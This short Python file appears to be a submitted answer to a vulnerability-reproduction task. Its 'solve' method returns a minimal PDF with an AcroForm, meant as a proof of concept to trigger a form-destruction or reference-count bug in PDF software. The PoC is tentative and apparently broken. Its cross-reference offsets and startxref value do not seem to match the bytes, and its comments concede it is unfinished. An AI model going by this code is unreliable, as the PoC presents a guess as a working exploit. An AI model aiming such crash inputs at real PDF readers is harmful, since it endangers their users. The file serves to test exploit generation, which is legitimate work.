class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal PDF with AcroForm to potentially trigger form destruction issue
        poc = b"""%PDF-1.7
1 0 obj
<< /Type /Catalog /AcroForm 2 0 R >>
endobj
2 0 obj
<< /Type /AcroForm /Fields [] /SigFlags 3 >>
endobj
xref
0 3
0000000000 65535 f 
0000000010 00000 n 
0000000075 00000 n 
trailer
<< /Size 3 /Root 1 0 R >>
startxref
150
%%EOF"""
        # Pad to approximate length if needed, but for PoC, keep minimal
        # In practice, expand with junk or specific dict to trigger refcount issue
        return poc